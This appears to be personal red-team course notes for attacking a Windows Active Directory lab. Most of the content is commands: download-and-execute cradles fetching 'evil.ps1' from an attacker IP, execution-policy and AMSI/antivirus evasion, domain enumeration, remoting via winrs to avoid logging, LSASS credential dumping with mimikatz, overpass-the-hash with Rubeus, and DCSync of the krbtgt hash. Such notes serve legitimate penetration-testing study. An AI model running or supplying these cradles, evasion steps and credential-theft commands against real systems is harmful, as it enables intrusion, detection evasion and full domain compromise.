
**PowerShell is NOT powershell.exe. It is the System.Management.Automation.dll**

--- 

# Load PowerShell Scripts and Modules

How we can Run/Load Powershell scripts

*  Load using dot sourcing
```
. C:\AD\Tools\PowerView.ps1
```

* A module (or a script) can be imported with:
```
Import-Module C:\AD\Tools\ADModulemaster\ActiveDirectory\ActiveDirectory.psd1
```

* All the commands in a module can be listed with: 
```
Get-Command -Module <modulename>
```

# PowerShell Script Execution

How we can exectute powershell scripts (W/Wo downloading locally)

* Download execute cradle:
```
iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1') 
```

```
$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.230.1/evil.ps1 ');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
```

* PSv3 onwards
```
iex (iwr 'http://192.168.230.1/evil.ps1')
```

```
$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://192.168.230.1/evil.ps1',$false);$h.send();iex $h.responseText
```

```
$wr = [System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1") $r = $wr.GetResponse() IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```

# Execution Policy

Execution Policy is NOT a security measure, it is present to prevent user from `accidently` executing scripts.

* Ways to bypass :
```
powershell -ExecutionPolicy bypass 
powershell -c <cmd>
powershell -encodedcommand 
$env:PSExecutionPolicyPreference="bypass"
```

# Bypassing PowerShell Security (Obfuscation)
#invisishell #invis

Mainly focus on tool **Invisi-Shell**

```
https://github.com/OmerYa/Invisi-Shell
```

* With admin privileges:
```
RunWithPathAsAdmin.bat
``` 

*  With non-admin privileges: 
```
RunWithRegistryNonAdmin.bat
```


# Bypassing AV Signatures for PowerShell
#amsi

🚨 Usefull and important to be osfuscated and hidden 

We use tools like AMSITrigger and DefenderCheck for Bypassing AV signatures

```
https://github.com/RythmStick/AMSITrigger
```

```
https://github.com/t3hbb/DefenderCheck
```

How to use :
```
AmsiTrigger_x64.exe -i PowerUp.ps1
DefenderCheck.exe PowerUp.ps1
```

*  full obfuscation of PowerShell scripts, we can use Invoke-Obfuscation 
```
https://github.com/danielbohannon/Invoke-Obfuscation
```

* Steps to avoid signature based detection:
1)  Scan using AMSITrigger 
2)  Modify the detected code snippet 
3)  Rescan using AMSITrigger 
4)  Repeat the steps 2 & 3 till we get a result as “AMSI_RESULT_NOT_DETECTED” or “Blank”


# Domain Enumeration

For enumeration we can use the following tools :
   * ADModule - The ActiveDirectory PowerShell module
   * PowerView 
   * SharpView

### Using PowerView
#powerview #enum

* Get current domain
```
Get-Domain
```

* Get object of another domain
```
Get-Domain -Domain moneycorp.local
```

* Get domain SID of current domain
```
Get-DomainSID
```

* Get domain policy for the current domain
```
Get-DomainPolicyData
```

* Get domain controllers for the current domain
```
Get-DomainController
```

* Get domain controllers for another domain
```
Get-DomainController -Domain moneycorp.local
```

* Get a list of users in the current domain
```
Get-DomainUser 
Get-DomainUser | select samaccountname
Get-DomainUser | select samaccountname,logonCount 
Get-DomainUser -Identity student1
```

* Get list of all properties for users in the current domain
```
Get-DomainUser -Identity student1 -Properties * 
Get-DomainUser -Properties samaccountname,logonCount
```

* Search for a particular string in a user's attributes:
```
Get-DomainUser -LDAPFilter "Description=*built*" | Select name,Description
```

* Get a list of computers in the current domain:
```
Get-DomainComputer | select Name 
Get-DomainComputer | select dnshostname,logonCount 
Get-DomainComputer -OperatingSystem "*Server 2022*" 
Get-DomainComputer -Ping
```

* Get all the groups in the current domain:
```
Get-DomainGroup | select Name 
Get-DomainGroup -Domain moneycorp.local
```

* Get all groups containing the word "admin" in group name
```
Get-DomainGroup *admin* | select Name 
Get-DomainGroup *admin* -Domain moneycorp.local | select Name 
```

* Get all the members of the Domain Admins group :
```
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

* Get the group membership for a user: 
```
Get-DomainGroup -UserName "student1"
```

* List all the local groups on a machine (needs administrator privs on non-dc machines) :
```
Get-NetLocalGroup -ComputerName dcorp-dc
```

* Get members of the local group "Administrators" on a machine (needs administrator privs on non-dc machines) :
```
Get-NetLocalGroupMember -ComputerName dcorp-dc -GroupName Administrators
```

* Get actively logged users on a computer (needs local admin rights on the target):
```
Get-NetLoggedon -ComputerName dcorp-adminsrv
```

* Get locally logged users on a computer (needs remote registry on the target - started by-default on server OS) :
```
Get-LoggedonLocal -ComputerName dcorp-adminsrv
```

* Get the last logged user on a computer (needs administrative rights and remote registry on the target:
```
Get-LastLoggedOn -ComputerName dcorp-adminsrv
```

* Find shares on hosts in current domain :
```
Invoke-ShareFinder -Verbose
``` 

*  Find sensitive files on computers in the domain : 
```
Invoke-FileFinder -Verbose
``` 

* Get all fileservers of the domain:
```
Get-NetFileServer
```

Alternatively we can use tool to enumerate shares such as `PowerHuntShares`

```
https://github.com/NetSPI/PowerHuntShares
```

Now let's find a file share where studentx has Write permissions ::

First get all the hosts to scan
```
Get-DomainComputer | select -ExpandProperty dnshostname 
```
save this hosts (Excluding DC) to servers.txt

Load the module
```
Import-Module c:\AD\Tools\PowerHuntShares.psm1
```

🚨 Remember to Exclude DC before running

Run :
```
Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools -HostList C:\AD\Tools\servers.txt
```



# Domain Enumeration - ACLs
#acl

Access Control List (ACL)

 It is a list of Access Control Entries (ACE) - ACE corresponds to individual
permission or audits access. Who has permission and what can be done
on an object?

• Two types:
– DACL - Defines the permissions trustees (a user or group) have on an object.
– SACL - Logs success and failure audit messages when an object is accessed.

* Get the ACLs associated with the specified object
```
Get-DomainObjectAcl -SamAccountName student1 -ResolveGUIDs
```
or Group

```
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs
```

* Get the ACLs associated with the specified prefix to be used for search
```
Get-DomainObjectAcl -SearchBase "LDAP://CN=Domain
Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs -
Verbose
```

* Search for interesting ACEs
```
Find-InterestingDomainAcl -ResolveGUIDs
```

* Get the ACLs associated with the specified path
```
Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"
```


# Domain Enumeration - GPO 
#gpo

Get list of GPO in current domain
```
Get-DomainGPO
Get-DomainGPO | select displayname
Get-DomainGPO -ComputerIdentity dcorp-student1
```

* Get GPO(s) which use Restricted Groups or groups.xml for interesting users
```
Get-DomainGPOLocalGroup
```

* Get users which are in a local group of a machine using GPO
```
Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity
dcorp-student1
```

* Get machines where the given user is member of a specific group
```
Get-DomainGPOUserLocalGroupMapping -Identity student1 -
Verbose
```


# Domain Enumeration - OU 
#ou

* Get OUs in a domain
```
Get-DomainOU
Get-DomainOU | select name 
```

* Get GPO applied on an OU. Read GPOname from gplink attribute from Get-NetOU
```
Get-DomainGPO -Identity "{0D1CC23D-1F20-4EEE-AF64-
D99597AE2A6E}"
```

* List all computers in DevOps OU:
```
(Get-DomainOU -Identity DevOps).distinguishedname | %{Get-DomainComputer -searchBase $_} | select name
```

* Enumerate GPO applied on DevOps OU :

First enumerate the gplink using :
```
(Get-DomainOU -Odentity DevOps).gplink
```
Then use that gplink for :
```
Get-DomainGPO -Identity "gplink id"
```


# Domain Enumeration - Trusts

* Get a list of all domain trusts for the current domain
```
Get-DomainTrust
Get-DomainTrust -Domain us.dollarcorp.moneycorp.local
```

# Domain Enumeration - Forest

* Get details about the current forest
```
Get-Forest
Get-Forest -Forest eurocorp.local
Get-ADForest
Get-ADForest -Identity eurocorp.local
```

* Get all domains in the current forest
```
Get-ForestDomain
Get-ForestDomain -Forest eurocorp.local
```

* Get all global catalogs for the current forest
```
Get-ForestGlobalCatalog
Get-ForestGlobalCatalog -Forest eurocorp.local
```

# Domain Enumeration - User Hunting

* Find all machines on the current domain where the current user has local admin access
```
Find-LocalAdminAccess -Verbose
```

We can use tools below for the same : 
```
Find-WMILocalAdminAccess.ps1 
Find-PSRemotingLocalAdminAccess.ps1
```

* Find computers where a domain admin (or specified user/group) has sessions:
```
Find-DomainUserLocation -Verbose
Find-DomainUserLocation -UserGroupIdentity "RDPUsers"
```

* Find computers where a domain admin session is available and current user has admin access (uses Test-AdminAccess).
```
Find-DomainUserLocation -CheckAccess
```

* Find computers (File Servers and Distributed File servers) where a domain admin session is available.
```
Find-DomainUserLocation -Stealth
```

* List sessions on remote machines (https://github.com/Leo4j/Invoke-SessionHunter)
```
Invoke-SessionHunter -FailSafe
```

Above command doesn’t need admin access on remote machines. Uses Remote Registry and queries HKEY_USERS hive.

* An opsec friendly command would be (avoid connecting to all the targetmachines by specifying targets)
```
Invoke-SessionHunter -NoPortScan -Targets C:\AD\Tools\servers.txt
```

Always exclude DC


# Privilege Escalation - Local
#priv 

Services Issues using PowerUp

* Get services with unquoted paths and a space in their name.
```
Get-ServiceUnquoted -Verbose
```

* Get services where the current user can write to its binary path or change arguments to the binary
```
Get-ModifiableServiceFile -Verbose
```

*  Get the services whose configuration current user can modify.
```
Get-ModifiableService -Verbose
```

* Run all checks from :
– PowerUp
```
Invoke-AllChecks
```

– Privesc:
```
Invoke-PrivEscCheck
```

– PEASS-ng:
```
winPEASx64.exe
```



# Lateral Movement - PowerShell Remoting
#remoting

Commands can be used for powershell remoting
```
New-PSSession
Enter-PSSession
```
So, If we need to enter a new powershell session as `dcorp-adminsrv` : 
```
Enter-PSSession dcorp-adminsrv
```

Another method of running commands across domain or multiple machines with admin access : 

* One-to-Many
* Also known as Fan-out remoting.
* Using : 
```
Invoke-Command
```

* Use below to execute commands or scriptblocks:
```
Invoke-Command -Scriptblock {Get-Process} -ComputerName
(Get-Content <list_of_servers>)

Invoke-Command -Scriptblock {$env:computername;$env:username} -ComputerName dcorp-adminsrv

Invoke-Command -Scriptblock {whoami} -ComputerName (cat c:\AD\Tools\server.txt)
```

* Use below to execute scripts from files
```
Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)
```

* Use below to execute locally loaded function on the remote machines:
```
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>)
```

* In this case, we are passing Arguments. Keep in mind that only positional arguments could be passed this way:
```
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>) -ArgumentList
```

* Use below to execute "Stateful" commands using Invoke-Command:
```
$Sess = New-PSSession -Computername Server1
Invoke-Command -Session $Sess -ScriptBlock {$Proc = Get-Process}
Invoke-Command -Session $Sess -ScriptBlock {$Proc.Name}
```

##  PowerShell Remoting - Tradecraft

* PowerShell remoting supports the system-wide transcripts and deep
script block logging.
*  We can use winrs in place of PSRemoting to evade the logging (and still reap the benefit of 5985 allowed between hosts):
```
winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname
winrs -r:dcorp-adminsrv set computername
```

• We can also use winrm.vbs and COM objects of WSMan object - https://github.com/bohops/WSMan-WinRM

# Lateral Movement - Credential Extraction
#credential 

Credentials are extracted from LSASS because Windows must store them for authentication, and attackers steal them to move laterally, escalate privileges, and fully compromise the domain using legitimate access.

- **LSASS is a high-value target** because it stores active credentials
- **LSASS is heavily monitored**, so attackers may avoid touching it
- **Credentials can be extracted without accessing LSASS**:
    - **SAM Hive (Registry)**
        - Stores **local user account hashes**
    - **LSA Secrets / SECURITY Hive (Registry)**
        - Service account passwords
        - Cached domain credentials
    - **DPAPI-Protected Credentials (Disk)**
        - Windows Credential Manager / Vault
        - Browser cookies and saved passwords
        - Certificates

# Powershell History
#history

Another important place to hunt for credentials is Powershell History file, which is usually stored as plain text:

The default location for this file is 
```
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
You can get the location by running `Get-PSReadlineOption` and looking at the options. There’s a few history related ones:

- `HistorySavePath` - The file location
- `HistorySaveStyle` - Options are `SaveIncrementally`, which saves after each command; `SaveAtExit`, which appends on exiting PowerShell, or `SaveNothing`, which turns off the history file.
- `MaximumHistoryCount` - The max number of entries to record.

You can modify the options with the `Set-PSReadlineOption` commandlet.


# Lateral Movement - Mimikatz


Great Read : https://www.alteredsecurity.com/post/fantastic-windows-logon-types-and-where-to-find-credentials-in-them#viewer-d8oei

## Overview

* mimikatz can be used to extract credentials, tickets, replay credentials,
play with AD security and many more interesting attacks!
* It is one of the most widely known red team tool and is therefore
heavily fingerprinted.

### LSASS

* Dump credentials on a using Mimikatz.
```
mimikatz.exe -Command '"sekurlsa::ekeys"'
```

* Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)
```
SafetyKatz.exe "sekurlsa::ekeys"
```

* From a Linux attacking machine using impacket.

### OverPass-The-Hash

Over Pass the hash (OPTH) generate tokens from hashes or keys. Needs elevation (Run as administrator)
```
SafetyKatz.exe "sekurlsa::pth /user:administrator
/domain: dollarcorp.moneycorp.local
/aes256:<aes256keys> /run:cmd.exe" "exit"
```

*  The above commands starts a process with a logon type 9 (same as runas /netonly).

* Over Pass the hash (OPTH) generate tokens from hashes or keys.
* Below doesn't need elevation
```
Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
```

* Below command needs elevation
```
Rubeus.exe asktgt /user:administrator
/aes256:<aes256keys> /opsec
/createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

### DCSync

*  To extract credentials from the DC without code execution on it, we can use DCSync.
*  To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges for dcorp domain:
```
SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

*  By default, Domain Admins, Enterprise Admins or Domain Controller
privileges are required to run DCSync.


# Active Directory Domain Dominance

* There is much more to Active Directory than "just" the Domain Admin.
* Once we have DA privileges new avenues of persistence, escalation to EA and attacks across trust open up!
* Let's have a look at abusing trust within domain, across domains and forests and various attacks on Kerberos.

